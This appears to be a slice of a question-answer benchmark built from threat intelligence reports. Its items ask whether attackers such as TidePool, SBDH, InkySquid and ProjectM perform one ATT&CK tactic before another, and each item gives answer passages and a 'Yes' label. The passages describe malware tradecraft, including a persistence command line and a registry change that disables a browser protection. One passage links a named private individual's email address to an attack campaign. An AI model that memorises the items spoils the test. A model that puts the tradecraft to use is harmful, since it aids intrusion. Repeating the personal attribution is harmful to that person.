Execution: Upon execution, the SBDH malware contacts a remote server to download two main components: a backdoor and a data stealer. These components allow the attacker to gain full remote control of the compromised computer and implement advanced data exfiltration methods.
Defense Evasion: To avoid detection, the SBDH malware uses various communication methods with its command and control (C&C) server, including HTTP and SMTP protocols, and injecting emails into Microsoft Outlook Express. It also camouflages communications with the C&C server using fake image files (.JPG, .GIF) to carry data. In case of C&C server unavailability, a backup solution involves a hard-coded URL pointing to a fake image that contains the address of an alternative C&C server.
Collection: The SBDH malware includes powerful filters that allow the operator to specify in detail which data should be exfiltrated, based on conditions such as file extension, creation date, and file size. These filters can be modified via the malware configuration files.
Command and Control: The SBDH malware relies on network communication with its C&C server, using multiple methods for connection. It first attempts to use the HTTP protocol, then SMTP protocol via a free external gateway, and as a last resort, it communicates by injecting specially crafted emails into Microsoft Outlook Express. Incoming communications are searched in the victim's inbox for emails with a specific subject, which are then parsed for malware commands and have their subjects changed to prevent further examination by the malware.
Others: The SBDH toolkit was presented at the Copenhagen Cybercrime Conference 2016 by ESET researchers Tomáš Gardoň and Robert Lipovský. The toolkit targets governmental and public institutions in Central and Eastern Europe, focusing on economic growth and cooperation. The name 'SBDH' was found in the compilation paths of its downloader, and the string 'B64SBDH' acts as a trigger to download its remaining components from a remote server. The toolkit's techniques are similar to those used in Operation Buhtrap, demonstrating that advanced threats are still spread via simple vectors like malicious email attachments. Properly trained staff and multi-layered security solutions can mitigate such risks.",Yes,espionage-toolkit-targeting-central-eastern-europe-uncovered
1395,279,279-Command and Control-T1071-Application Layer Protocol,"After the SBDH malware employs powerful filters to specify and collect targeted data based on criteria such as file extension, creation date, and file size, is it likely to rely on HTTP and SMTP protocols for network communication with its C&C server under the Command and Control tactic?","Command and Control: The SBDH malware relies on network communication with its C&C server, using multiple methods for connection. It first attempts to use the HTTP protocol, then SMTP protocol via a free external gateway, and as a last resort, it communicates by injecting specially crafted emails into Microsoft Outlook Express. Incoming communications are searched in the victim's inbox for emails with a specific subject, which are then parsed for malware commands and have their subjects changed to prevent further examination by the malware.","Initial Access: The SBDH toolkit, identified by ESET, was distributed via phishing emails with executable attachments that had double extensions, relying on Windows' default behavior of hiding extensions. The executables used legitimate-looking icons of Microsoft applications or Word documents to increase the likelihood of execution by the recipient.
Execution: Upon execution, the SBDH malware contacts a remote server to download two main components: a backdoor and a data stealer. These components allow the attacker to gain full remote control of the compromised computer and implement advanced data exfiltration methods.
Persistence: The SBDH malware employs a unique persistence technique by replacing the handler for Word documents, ensuring that the malware is executed whenever a Word document is opened or edited on the infected system.
Defense Evasion: To avoid detection, the SBDH malware uses various communication methods with its command and control (C&C) server, including HTTP and SMTP protocols, and injecting emails into Microsoft Outlook Express. It also camouflages communications with the C&C server using fake image files (.JPG, .GIF) to carry data. In case of C&C server unavailability, a backup solution involves a hard-coded URL pointing to a fake image that contains the address of an alternative C&C server.
Collection: The SBDH malware includes powerful filters that allow the operator to specify in detail which data should be exfiltrated, based on conditions such as file extension, creation date, and file size. These filters can be modified via the malware configuration files.
Others: The SBDH toolkit was presented at the Copenhagen Cybercrime Conference 2016 by ESET researchers Tomáš Gardoň and Robert Lipovský. The toolkit targets governmental and public institutions in Central and Eastern Europe, focusing on economic growth and cooperation. The name 'SBDH' was found in the compilation paths of its downloader, and the string 'B64SBDH' acts as a trigger to download its remaining components from a remote server. The toolkit's techniques are similar to those used in Operation Buhtrap, demonstrating that advanced threats are still spread via simple vectors like malicious email attachments. Properly trained staff and multi-layered security solutions can mitigate such risks.",Yes,espionage-toolkit-targeting-central-eastern-europe-uncovered
1400,28,28-Execution-T1559-Inter-Process Communication,"After gaining initial access via spear phishing emails exploiting CVE-2015-2545, is Ke3chang likely to perform inter-process communication using TidePool malware before achieving persistence through the creation of an ActiveSetup key in the Windows Registry?","Execution: The CTI report details that the TidePool malware, once executed, allows the attacker to perform various actions such as reading, writing, and deleting files and folders, as well as running commands over named pipes. It gathers information about the victim's computer, encodes it in base64, and sends it to the Command and Control (C2) server via HTTP. This behavior matches the capabilities of the BS2005 malware family used by Ke3chang.","Initial Access: The CTI report by Unit 42 reveals an ongoing attack campaign against Indian embassy personnel worldwide, utilizing a new malware family named TidePool. The campaign is consistent with the tactics of the threat actor known as Ke3chang, which historically targeted the Ministry of Affairs and conducted several campaigns against India. The initial access is achieved through spear phishing emails that exploit the vulnerability CVE-2015-2545, first made public in September 2015. The emails contain weaponized documents that trigger the vulnerability when opened in Microsoft Word.
Persistence: TidePool achieves persistence by utilizing an ActiveSetup key in the Windows Registry, which ensures that the malware launches on boot with the following parameters: rundll32.exe C:\DOCUME~1\ALLUSE~1\IEHelper\mshtml.dll,,IEHelper
Defense Evasion: The report indicates that both TidePool and the BS2005 malware family, used by Ke3chang, focus on modifying the registry setting 'Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IEHarden' to 0. This disables the Internet Explorer Enhanced Security configuration, which is designed to prevent the execution of scripts, ActiveX Controls, file downloads, and the Microsoft virtual machine for HTML content. This technique is common to both malware families and is used as a means of defense evasion.
Command and Control: TidePool communicates with its C2 server using HTTP as the protocol. The C2 domain identified in the report is 'goback.strangled[.]net'. The malware sends victim computer information to the C2 server, which then allows it to receive commands and behave as a Remote Access Trojan (RAT).
Others: The CTI report by Unit 42 uncovers the evolution of the Ke3chang actor's malware arsenal, with TidePool being the latest iteration. The report provides a detailed analysis of the code reuse and behavioral similarities between TidePool and previous malware used by Ke3chang, such as BS2005. The targeting of Indian embassies aligns with Ke3chang's historical focus, and the use of a Chinese language encoding in the binaries suggests the actor's system likely runs an operating system with Chinese as the default display language. The report also includes indicators of compromise (IOCs) with hashes and compile dates of various samples linked to Ke3chang and TidePool.",Yes,operation-ke3chang-resurfaces-with-new-tidepool-malware
1406,280,280-Credential Access-T1056-Input Capture,"After impersonating technical support or friends to deliver phishing messages claiming copyright violations or offering verified badges, is it likely that the attackers will use phishing sites to collect Instagram usernames, passwords, and email credentials before locking out the original owners by changing account passwords?","Credential Access: The attackers behind the Instagram hacking campaign used phishing sites to collect victims' Instagram usernames, passwords, and associated email credentials. After obtaining these details, they changed the account passwords, effectively locking out the original owners. They also downloaded all images and messages from the accounts, either manually or through Instagram's data backup feature.","Initial Access: On July 12, 2021, Jindrich Karasek from Trend Micro reported on a campaign where cybercriminals targeted Instagram users, particularly influencers, to compromise their accounts. The attackers impersonated technical support or friends of the victims and used phishing emails, Telegram, WhatsApp, or Instagram to deliver their messages. These messages often contained generic greetings and claimed copyright violations or offered verified badges to lure victims into providing their credentials on phishing sites that mimicked Instagram's interface.
Impact: The cybercriminals demanded ransom payments in bitcoin, prepaid credit cards, or vouchers for the return of the compromised Instagram accounts. Despite some victims paying the ransom, the attackers did not restore access but instead continued to demand more payment. They also used the stolen accounts with significant followings to perpetuate their scams and sold their hacking expertise in the cybercriminal underground.",Yes,#NoFilter_ Exposing the Tactics of Instagram Account Hackers
1408,280,280-Impact-T1531-Account Access Removal,"After using phishing sites to collect Instagram credentials and locking out original account owners, is it likely that the cybercriminals will demand ransom payments before using the stolen accounts with significant followings to perpetuate further scams?","Impact: The cybercriminals demanded ransom payments in bitcoin, prepaid credit cards, or vouchers for the return of the compromised Instagram accounts. Despite some victims paying the ransom, the attackers did not restore access but instead continued to demand more payment. They also used the stolen accounts with significant followings to perpetuate their scams and sold their hacking expertise in the cybercriminal underground.","Initial Access: On July 12, 2021, Jindrich Karasek from Trend Micro reported on a campaign where cybercriminals targeted Instagram users, particularly influencers, to compromise their accounts. The attackers impersonated technical support or friends of the victims and used phishing emails, Telegram, WhatsApp, or Instagram to deliver their messages. These messages often contained generic greetings and claimed copyright violations or offered verified badges to lure victims into providing their credentials on phishing sites that mimicked Instagram's interface.
Credential Access: The attackers behind the Instagram hacking campaign used phishing sites to collect victims' Instagram usernames, passwords, and associated email credentials. After obtaining these details, they changed the account passwords, effectively locking out the original owners. They also downloaded all images and messages from the accounts, either manually or through Instagram's data backup feature.",Yes,#NoFilter_ Exposing the Tactics of Instagram Account Hackers
1409,280,280-Impact-T1657-Financial Theft,"After collecting victims' Instagram credentials through phishing sites, is it likely that the attackers will demand ransom payments for the return of compromised accounts after locking out the original owners by changing the passwords?","Impact: The cybercriminals demanded ransom payments in bitcoin, prepaid credit cards, or vouchers for the return of the compromised Instagram accounts. Despite some victims paying the ransom, the attackers did not restore access but instead continued to demand more payment. They also used the stolen accounts with significant followings to perpetuate their scams and sold their hacking expertise in the cybercriminal underground.","Initial Access: On July 12, 2021, Jindrich Karasek from Trend Micro reported on a campaign where cybercriminals targeted Instagram users, particularly influencers, to compromise their accounts. The attackers impersonated technical support or friends of the victims and used phishing emails, Telegram, WhatsApp, or Instagram to deliver their messages. These messages often contained generic greetings and claimed copyright violations or offered verified badges to lure victims into providing their credentials on phishing sites that mimicked Instagram's interface.
Credential Access: The attackers behind the Instagram hacking campaign used phishing sites to collect victims' Instagram usernames, passwords, and associated email credentials. After obtaining these details, they changed the account passwords, effectively locking out the original owners. They also downloaded all images and messages from the accounts, either manually or through Instagram's data backup feature.",Yes,#NoFilter_ Exposing the Tactics of Instagram Account Hackers
1413,281,281-Command and Control-T1008-Fallback Channels,"After the Zombie Zero malware discovered servers with 'finance' in their hostname and compromised the ERP financial server, is it likely that the malware established a secondary stealth botnet command and control (CnC) network before exfiltrating all financial and ERP data?","Command and Control: The malware facilitated the upload of a standby weaponized payload that established a command and control connection to a Chinese botnet terminating at the Lanxiang Vocational School in the China Unicom Shandong province network. A more sophisticated command and control of the company's finance server was established, along with a secondary stealth botnet CnC network terminating in Beijing.","Initial Access: The attack, known as Zombie Zero, was initiated through the delivery of weaponized malware embedded in a proprietary hardware/software scanner application used by logistics and shipping industries worldwide. The malware was delivered from a Chinese factory and was also found in a version of Windows XP installed on the hardware at the manufacturer's location in China, as well as on the manufacturer's support website.
Persistence: The malware persisted in the Windows XP embedded version located at the Chinese manufacturer's support website hosted in China.
Discovery: Once connected to the wireless network, the malware began an automated attack using the SMB protocol. At Site 1, with network segmentation and a firewall, the SMB attack was blocked, but a secondary attack using the RADMIN protocol infected over nine servers. At Site 2, without a firewall, the SMB attack succeeded. The malware specifically targeted servers with 'finance' in their hostname, compromising the ERP financial server.
Exfiltration: All financial data and ERP data were exfiltrated, providing the attacker with complete situational awareness and visibility into the logistics/shipping company's worldwide operations.",Yes,TrapX_ZOMBIE_Report_Final
1414,282,282-Initial Access-T1195-Supply Chain Compromise,"Before CrateDepression drops Poseidon payloads via a malicious crate named 'rustdecimal', is it likely that other macOS malware such as Alchimist, ChromeLoader, or CloudMensis would employ their respective mechanisms for gaining initial access, such as binding a shell to a port, spreading through DMGs, or exploiting CVE-2020-9934?","Initial Access: The CTI report from December 7, 2022, by Phil Stokes, highlights several Initial Access techniques used by malware targeting macOS in 2022. Notably, Alchimist, a cross-platform attack framework, provides a backdoor onto target systems by binding a shell to a port for remote access. ChromeLoader, also known as ChromeBack or Choziosi Loader, spreads through malverts and malspam, using a DMG containing a shell script to install a Chrome browser extension capable of stealing information and serving adware. CloudMensis spyware uses public cloud storage services for C2 communication and exploits CVE-2020-9934 to bypass TCC restrictions. CrateDepression, a supply chain attack on the Rust development community, drops Poseidon payloads via a malicious crate named 'rustdecimal'. DazzleSpy, a sophisticated malware, uses advanced techniques for evasion and persistence, masquerading as an Apple launch service. Gimmick, related to macOS.Macma, is a backdoor used by an APT targeting activists in Hong Kong, leveraging cloud hosting services for C2. Lazarus Group's Operation In(ter)ception targets Coinbase and Crypto.com users with lures of job offers and drops multi-stage macOS malware. oRAT, distributed via a Disk Image masquerading as Bitget Apps, delivers a payload with backdoor functionality. Pymafka, a malicious Python package, infects users through typosquatting and downloads a Mach-O binary called 'MacOs'. Lastly, a VPN Trojan drops two malicious binaries, 'softwareupdated' and 'covid', using a script executed from a DMG.","Persistence: The CTI report identifies several Persistence techniques used by macOS malware in 2022. Alchimist malware attempts to establish a persistent backdoor on the target system. ChromeLoader uses a Bash script to install a persistent Chrome browser extension. CloudMensis spyware employs a downloader and implant for persistent operations. CrateDepression malware checks for the GITLAB_CI environment variable for Continuous Integration (CI) pipelines and retrieves a second-stage payload for persistence. DazzleSpy installs a LaunchAgent for persistence that masquerades as an Apple launch service. Gimmick uses similar persistence agent labels as macOS.Macma. Operation In(ter)ception installs a LaunchAgent for persistence in the user's local folder. oRAT delivers a payload to the /tmp directory for persistence. The VPN Trojan executes a script which drops a persistence agent with the filename com.apple.softwareupdate.plist.
Defense Evasion: The CTI report from December 7, 2022, by Phil Stokes, details Defense Evasion techniques used by macOS malware in 2022. Alchimist contains a privilege escalation exploit for CVE-2021-4034, although this tool is rarely found on Macs. ChromeLoader attempts to override macOS security technology with an animated image. CloudMensis exploits CVE-2020-9934 to bypass TCC restrictions. DazzleSpy uses advanced techniques to evade detection and maintain a foothold on infected machines. Gimmick and Macma share indicator overlaps, suggesting evasion tactics. Operation In(ter)ception uses lures and masquerades as legitimate processes for evasion. The VPN Trojan has superficial similarities to DazzleSpy, indicating possible evasion techniques.
Command and Control: The CTI report from December 7, 2022, by Phil Stokes, mentions Command and Control techniques used by macOS malware in 2022. Alchimist uses a web interface for controlling the implanted malware and generating payloads. ChromeLoader installs a listener to intercept outgoing browser traffic and communicate with the attacker's C2. CloudMensis uses public cloud storage services for C2 communication. Gimmick takes advantage of cloud hosting services like Google Drive for its C2 communications. Operation In(ter)ception's malware serves as a downloader for a fourth stage from a C2. oRAT includes a custom package with primary backdoor functionality for C2 communication. The VPN Trojan reaches out to a C2 for further tasking.
Others: The CTI report from December 7, 2022, by Phil Stokes, also mentions other malware discoveries in 2022 that do not fall under the specific tactics categories but are still significant. SysJoker is a backdoor written in Objective-C with variants for Windows, Linux, and macOS, distributed via an executable named types-config.ts. XCSSET malware saw a new variant, and a Mac version of a trojanized Chinese chat application called Mimi, attributed to IronTiger APT group, was reported. Adware infections from Pirrit, Bundlore, and Adload continue to target users with changing techniques. SentinelOne's Singularity platform defends against these threats, and SentinelLabs has published several ebooks to help understand and mitigate risks associated with macOS malware.",Yes,top-10-macos-malware-discoveries-in-2022
1416,282,282-Defense Evasion-T1211-Exploitation for Defense Evasion,"After ChromeLoader attempts to override macOS security technology with an animated image, is CloudMensis likely to exploit CVE-2020-9934 for bypassing TCC restrictions before using public cloud storage services for C2 communication?","Defense Evasion: The CTI report from December 7, 2022, by Phil Stokes, details Defense Evasion techniques used by macOS malware in 2022. Alchimist contains a privilege escalation exploit for CVE-2021-4034, although this tool is rarely found on Macs. ChromeLoader attempts to override macOS security technology with an animated image. CloudMensis exploits CVE-2020-9934 to bypass TCC restrictions. DazzleSpy uses advanced techniques to evade detection and maintain a foothold on infected machines. Gimmick and Macma share indicator overlaps, suggesting evasion tactics. Operation In(ter)ception uses lures and masquerades as legitimate processes for evasion. The VPN Trojan has superficial similarities to DazzleSpy, indicating possible evasion techniques.","Initial Access: The CTI report from December 7, 2022, by Phil Stokes, highlights several Initial Access techniques used by malware targeting macOS in 2022. Notably, Alchimist, a cross-platform attack framework, provides a backdoor onto target systems by binding a shell to a port for remote access. ChromeLoader, also known as ChromeBack or Choziosi Loader, spreads through malverts and malspam, using a DMG containing a shell script to install a Chrome browser extension capable of stealing information and serving adware. CloudMensis spyware uses public cloud storage services for C2 communication and exploits CVE-2020-9934 to bypass TCC restrictions. CrateDepression, a supply chain attack on the Rust development community, drops Poseidon payloads via a malicious crate named 'rustdecimal'. DazzleSpy, a sophisticated malware, uses advanced techniques for evasion and persistence, masquerading as an Apple launch service. Gimmick, related to macOS.Macma, is a backdoor used by an APT targeting activists in Hong Kong, leveraging cloud hosting services for C2. Lazarus Group's Operation In(ter)ception targets Coinbase and Crypto.com users with lures of job offers and drops multi-stage macOS malware. oRAT, distributed via a Disk Image masquerading as Bitget Apps, delivers a payload with backdoor functionality. Pymafka, a malicious Python package, infects users through typosquatting and downloads a Mach-O binary called 'MacOs'. Lastly, a VPN Trojan drops two malicious binaries, 'softwareupdated' and 'covid', using a script executed from a DMG.
Persistence: The CTI report identifies several Persistence techniques used by macOS malware in 2022. Alchimist malware attempts to establish a persistent backdoor on the target system. ChromeLoader uses a Bash script to install a persistent Chrome browser extension. CloudMensis spyware employs a downloader and implant for persistent operations. CrateDepression malware checks for the GITLAB_CI environment variable for Continuous Integration (CI) pipelines and retrieves a second-stage payload for persistence. DazzleSpy installs a LaunchAgent for persistence that masquerades as an Apple launch service. Gimmick uses similar persistence agent labels as macOS.Macma. Operation In(ter)ception installs a LaunchAgent for persistence in the user's local folder. oRAT delivers a payload to the /tmp directory for persistence. The VPN Trojan executes a script which drops a persistence agent with the filename com.apple.softwareupdate.plist.
Command and Control: The CTI report from December 7, 2022, by Phil Stokes, mentions Command and Control techniques used by macOS malware in 2022. Alchimist uses a web interface for controlling the implanted malware and generating payloads. ChromeLoader installs a listener to intercept outgoing browser traffic and communicate with the attacker's C2. CloudMensis uses public cloud storage services for C2 communication. Gimmick takes advantage of cloud hosting services like Google Drive for its C2 communications. Operation In(ter)ception's malware serves as a downloader for a fourth stage from a C2. oRAT includes a custom package with primary backdoor functionality for C2 communication. The VPN Trojan reaches out to a C2 for further tasking.
Others: The CTI report from December 7, 2022, by Phil Stokes, also mentions other malware discoveries in 2022 that do not fall under the specific tactics categories but are still significant. SysJoker is a backdoor written in Objective-C with variants for Windows, Linux, and macOS, distributed via an executable named types-config.ts. XCSSET malware saw a new variant, and a Mac version of a trojanized Chinese chat application called Mimi, attributed to IronTiger APT group, was reported. Adware infections from Pirrit, Bundlore, and Adload continue to target users with changing techniques. SentinelOne's Singularity platform defends against these threats, and SentinelLabs has published several ebooks to help understand and mitigate risks associated with macOS malware.",Yes,top-10-macos-malware-discoveries-in-2022
1422,282,282-Persistence-T1176-Browser Extensions,"After distributing its payload via a DMG containing a shell script in the Initial Access phase, is ChromeLoader likely to install a persistent Chrome browser extension before attempting to evade macOS security technology with an animated image as part of its Defense Evasion tactics?",Persistence: The CTI report identifies several Persistence techniques used by macOS malware in 2022. Alchimist malware attempts to establish a persistent backdoor on the target system. ChromeLoader uses a Bash script to install a persistent Chrome browser extension. CloudMensis spyware employs a downloader and implant for persistent operations. CrateDepression malware checks for the GITLAB_CI environment variable for Continuous Integration (CI) pipelines and retrieves a second-stage payload for persistence. DazzleSpy installs a LaunchAgent for persistence that masquerades as an Apple launch service. Gimmick uses similar persistence agent labels as macOS.Macma. Operation In(ter)ception installs a LaunchAgent for persistence in the user's local folder. oRAT delivers a payload to the /tmp directory for persistence. The VPN Trojan executes a script which drops a persistence agent with the filename com.apple.softwareupdate.plist.,"Initial Access: The CTI report from December 7, 2022, by Phil Stokes, highlights several Initial Access techniques used by malware targeting macOS in 2022. Notably, Alchimist, a cross-platform attack framework, provides a backdoor onto target systems by binding a shell to a port for remote access. ChromeLoader, also known as ChromeBack or Choziosi Loader, spreads through malverts and malspam, using a DMG containing a shell script to install a Chrome browser extension capable of stealing information and serving adware. CloudMensis spyware uses public cloud storage services for C2 communication and exploits CVE-2020-9934 to bypass TCC restrictions. CrateDepression, a supply chain attack on the Rust development community, drops Poseidon payloads via a malicious crate named 'rustdecimal'. DazzleSpy, a sophisticated malware, uses advanced techniques for evasion and persistence, masquerading as an Apple launch service. Gimmick, related to macOS.Macma, is a backdoor used by an APT targeting activists in Hong Kong, leveraging cloud hosting services for C2. Lazarus Group's Operation In(ter)ception targets Coinbase and Crypto.com users with lures of job offers and drops multi-stage macOS malware. oRAT, distributed via a Disk Image masquerading as Bitget Apps, delivers a payload with backdoor functionality. Pymafka, a malicious Python package, infects users through typosquatting and downloads a Mach-O binary called 'MacOs'. Lastly, a VPN Trojan drops two malicious binaries, 'softwareupdated' and 'covid', using a script executed from a DMG.
Defense Evasion: The CTI report from December 7, 2022, by Phil Stokes, details Defense Evasion techniques used by macOS malware in 2022. Alchimist contains a privilege escalation exploit for CVE-2021-4034, although this tool is rarely found on Macs. ChromeLoader attempts to override macOS security technology with an animated image. CloudMensis exploits CVE-2020-9934 to bypass TCC restrictions. DazzleSpy uses advanced techniques to evade detection and maintain a foothold on infected machines. Gimmick and Macma share indicator overlaps, suggesting evasion tactics. Operation In(ter)ception uses lures and masquerades as legitimate processes for evasion. The VPN Trojan has superficial similarities to DazzleSpy, indicating possible evasion techniques.
Command and Control: The CTI report from December 7, 2022, by Phil Stokes, mentions Command and Control techniques used by macOS malware in 2022. Alchimist uses a web interface for controlling the implanted malware and generating payloads. ChromeLoader installs a listener to intercept outgoing browser traffic and communicate with the attacker's C2. CloudMensis uses public cloud storage services for C2 communication. Gimmick takes advantage of cloud hosting services like Google Drive for its C2 communications. Operation In(ter)ception's malware serves as a downloader for a fourth stage from a C2. oRAT includes a custom package with primary backdoor functionality for C2 communication. The VPN Trojan reaches out to a C2 for further tasking.
Others: The CTI report from December 7, 2022, by Phil Stokes, also mentions other malware discoveries in 2022 that do not fall under the specific tactics categories but are still significant. SysJoker is a backdoor written in Objective-C with variants for Windows, Linux, and macOS, distributed via an executable named types-config.ts. XCSSET malware saw a new variant, and a Mac version of a trojanized Chinese chat application called Mimi, attributed to IronTiger APT group, was reported. Adware infections from Pirrit, Bundlore, and Adload continue to target users with changing techniques. SentinelOne's Singularity platform defends against these threats, and SentinelLabs has published several ebooks to help understand and mitigate risks associated with macOS malware.",Yes,top-10-macos-malware-discoveries-in-2022
1423,282,282-Persistence-T1543-Create or Modify System Process,"After leveraging malverts and malspam campaigns to spread through disk images for initial access, is it likely that DazzleSpy malware and Operation In(ter)ception campaign will install a LaunchAgent in macOS systems for persistence before employing sophisticated evasion techniques to avoid detection and maintain a foothold?",Persistence: The CTI report identifies several Persistence techniques used by macOS malware in 2022. Alchimist malware attempts to establish a persistent backdoor on the target system. ChromeLoader uses a Bash script to install a persistent Chrome browser extension. CloudMensis spyware employs a downloader and implant for persistent operations. CrateDepression malware checks for the GITLAB_CI environment variable for Continuous Integration (CI) pipelines and retrieves a second-stage payload for persistence. DazzleSpy installs a LaunchAgent for persistence that masquerades as an Apple launch service. Gimmick uses similar persistence agent labels as macOS.Macma. Operation In(ter)ception installs a LaunchAgent for persistence in the user's local folder. oRAT delivers a payload to the /tmp directory for persistence. The VPN Trojan executes a script which drops a persistence agent with the filename com.apple.softwareupdate.plist.,"Initial Access: The CTI report from December 7, 2022, by Phil Stokes, highlights several Initial Access techniques used by malware targeting macOS in 2022. Notably, Alchimist, a cross-platform attack framework, provides a backdoor onto target systems by binding a shell to a port for remote access. ChromeLoader, also known as ChromeBack or Choziosi Loader, spreads through malverts and malspam, using a DMG containing a shell script to install a Chrome browser extension capable of stealing information and serving adware. CloudMensis spyware uses public cloud storage services for C2 communication and exploits CVE-2020-9934 to bypass TCC restrictions. CrateDepression, a supply chain attack on the Rust development community, drops Poseidon payloads via a malicious crate named 'rustdecimal'. DazzleSpy, a sophisticated malware, uses advanced techniques for evasion and persistence, masquerading as an Apple launch service. Gimmick, related to macOS.Macma, is a backdoor used by an APT targeting activists in Hong Kong, leveraging cloud hosting services for C2. Lazarus Group's Operation In(ter)ception targets Coinbase and Crypto.com users with lures of job offers and drops multi-stage macOS malware. oRAT, distributed via a Disk Image masquerading as Bitget Apps, delivers a payload with backdoor functionality. Pymafka, a malicious Python package, infects users through typosquatting and downloads a Mach-O binary called 'MacOs'. Lastly, a VPN Trojan drops two malicious binaries, 'softwareupdated' and 'covid', using a script executed from a DMG.
Defense Evasion: The CTI report from December 7, 2022, by Phil Stokes, details Defense Evasion techniques used by macOS malware in 2022. Alchimist contains a privilege escalation exploit for CVE-2021-4034, although this tool is rarely found on Macs. ChromeLoader attempts to override macOS security technology with an animated image. CloudMensis exploits CVE-2020-9934 to bypass TCC restrictions. DazzleSpy uses advanced techniques to evade detection and maintain a foothold on infected machines. Gimmick and Macma share indicator overlaps, suggesting evasion tactics. Operation In(ter)ception uses lures and masquerades as legitimate processes for evasion. The VPN Trojan has superficial similarities to DazzleSpy, indicating possible evasion techniques.
Command and Control: The CTI report from December 7, 2022, by Phil Stokes, mentions Command and Control techniques used by macOS malware in 2022. Alchimist uses a web interface for controlling the implanted malware and generating payloads. ChromeLoader installs a listener to intercept outgoing browser traffic and communicate with the attacker's C2. CloudMensis uses public cloud storage services for C2 communication. Gimmick takes advantage of cloud hosting services like Google Drive for its C2 communications. Operation In(ter)ception's malware serves as a downloader for a fourth stage from a C2. oRAT includes a custom package with primary backdoor functionality for C2 communication. The VPN Trojan reaches out to a C2 for further tasking.
Others: The CTI report from December 7, 2022, by Phil Stokes, also mentions other malware discoveries in 2022 that do not fall under the specific tactics categories but are still significant. SysJoker is a backdoor written in Objective-C with variants for Windows, Linux, and macOS, distributed via an executable named types-config.ts. XCSSET malware saw a new variant, and a Mac version of a trojanized Chinese chat application called Mimi, attributed to IronTiger APT group, was reported. Adware infections from Pirrit, Bundlore, and Adload continue to target users with changing techniques. SentinelOne's Singularity platform defends against these threats, and SentinelLabs has published several ebooks to help understand and mitigate risks associated with macOS malware.",Yes,top-10-macos-malware-discoveries-in-2022
1427,283,283-Defense Evasion-T1564-Hide Artifacts,"After redirecting users of the compromised Daily NK website to attacker-owned domains that hosted malicious JavaScript, is it likely that InkySquid attackers would use cloud providers like Microsoft Graph API for BLUELIGHT malware command and control operations after disguising exploit code within legitimate code on the compromised website?","Defense Evasion: InkySquid attackers cleverly disguised exploit code within legitimate code on the compromised Daily NK website, making detection difficult. They also restricted access to the exploit code to only exploitable user-agents, further evading automated scanning and detection.","Initial Access: Volexity reported a strategic web compromise (SWC) of the South Korean online newspaper Daily NK's website, where malicious code was present from late March 2021 until early June 2021. The attackers, identified as North Korean APT InkySquid, modified legitimate files on the website to redirect users to attacker-owned domains hosting malicious JavaScript. This activity targeted Internet Explorer users, leveraging exploits such as CVE-2020-1380 and CVE-2021-26411.
Command and Control: The BLUELIGHT malware, attributed to InkySquid, uses cloud providers like Microsoft Graph API for command and control operations. It performs oauth2 token authentication and sets up a directory structure in OneDrive for C2 protocol. The malware collects and uploads reconnaissance data, including system information and screenshots, and receives commands through the 'background' subdirectory.
Others: The BLUELIGHT malware, after successful exploitation, decrypts a final SVG variable containing a hex-encoded Cobalt Strike stager, which is then executed. The malware leverages Microsoft Graph API for C2 operations, collecting system information and screenshots, and supports various commands including file search, data harvesting, and implant uninstallation. IoCs and signatures related to this activity are available on Volexity's GitHub page.",Yes,volexity.com-North Korean APT InkySquid Infects Victims Using Browser Exploits
1433,284,284-Command and Control-T1105-Ingress Tool Transfer,"After ProjectM actors gained initial access by exploiting vulnerabilities in malicious RTF and Excel files, is it likely that they would utilize domains to host C2 servers before the Andromeda Trojan delivers payloads from these servers?","Command and Control: The ProjectM campaign's command and control infrastructure included domains registered with WHOIS protection, but two domains were linked to an individual's email address. These domains were used to host C2 servers for the Andromeda Trojan, which delivered further payloads.","Reconnaissance: Unit 42 has identified an attack campaign targeting Indian government and military personnel, overlapping with Operation Transparent Tribe and Operation C-Major. The campaign, known as 'ProjectM,' has been linked to an individual from Pakistan through open source research. The actors used spear-phishing emails and watering hole sites, including a blog titled 'India News Tribe,' to deliver various tools such as Trojans Crimson and Peppy, as well as RATs like DarkComet and Bozok. Techniques observed include the exploitation of CVE-2010-3333 and CVE-2012-0158, and the use of malicious macros in Excel files.
Resource Development: The ProjectM actors have developed a significant toolset for their campaigns, including custom tools and off-the-shelf RATs. They have also utilized the Andromeda Trojan as an initial payload to download and execute other tools. Infrastructure used by ProjectM was often registered using WHOIS protection services, but two domains, 'winupdater[.]info' and 'ordering-checks[.]com,' were registered without protection, revealing the email address 'mshoaib.yaseen [at] gmail.com'. This email is linked to various social media accounts and suggests the individual's involvement in web design services and revenue generation through Google AdSense.
Initial Access: ProjectM actors gained initial access through spear-phishing emails and watering hole attacks, delivering payloads via malicious RTF and Excel files exploiting known vulnerabilities.
Execution: The ProjectM campaign executed malicious code through the use of Trojans like Crimson and Peppy, as well as RATs such as DarkComet and Bozok. Techniques included the exploitation of vulnerabilities and the use of malicious macros.
Defense Evasion: The ProjectM campaign utilized WHOIS protection services to conceal their infrastructure, but lapses in this practice revealed connections to an individual potentially involved in the campaign. The use of various Trojans and RATs also suggests techniques for defense evasion.
Others: The individual linked to ProjectM's infrastructure appears to have skills in offensive cyber operations, as suggested by social media posts and blog content related to network scanning, Metasploit, and post-exploitation activities. The actor's name was found in the debug symbol path of Crimson tools, indicating possible involvement in malware development. The actor's anti-Indian sentiment, as expressed on social media, suggests a potential political motivation behind the attacks. Trend Micro discovered gigabytes of personal identifiable information (PII) on C2 servers related to ProjectM, indicating the collection of sensitive data from Indian Army personnel.",Yes,unit42-projectm-link-found-between-pakistani-actor-and-operation-transparent-tribe
1438,284,284-Reconnaissance-T1589-Gather Victim Identity Information,"After ProjectM actors developed their custom toolset for campaigns and registered domains with or without WHOIS protection services, is it likely that they gathered victim identity information as part of their reconnaissance efforts before gaining initial access through spear-phishing emails and watering hole attacks?","Reconnaissance: Unit 42 has identified an attack campaign targeting Indian government and military personnel, overlapping with Operation Transparent Tribe and Operation C-Major. The campaign, known as 'ProjectM,' has been linked to an individual from Pakistan through open source research. The actors used spear-phishing emails and watering hole sites, including a blog titled 'India News Tribe,' to deliver various tools such as Trojans Crimson and Peppy, as well as RATs like DarkComet and Bozok. Techniques observed include the exploitation of CVE-2010-3333 and CVE-2012-0158, and the use of malicious macros in Excel files.","Resource Development: The ProjectM actors have developed a significant toolset for their campaigns, including custom tools and off-the-shelf RATs. They have also utilized the Andromeda Trojan as an initial payload to download and execute other tools. Infrastructure used by ProjectM was often registered using WHOIS protection services, but two domains, 'winupdater[.]info' and 'ordering-checks[.]com,' were registered without protection, revealing the email address 'mshoaib.yaseen [at] gmail.com'. This email is linked to various social media accounts and suggests the individual's involvement in web design services and revenue generation through Google AdSense.
